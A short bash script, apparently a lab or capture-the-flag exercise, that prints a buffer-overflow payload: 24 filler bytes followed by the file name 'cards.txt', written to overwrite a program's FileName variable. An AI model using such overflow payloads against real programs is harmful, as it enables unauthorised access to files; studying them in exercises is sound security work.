#!/bin/bash

# write garbage to buff
perl -e 'print "A"x16;'

# write extra As to reach FileName
perl -e 'print "A"x8;'

# write the file name to FileName
perl -e 'print "cards.txt";'

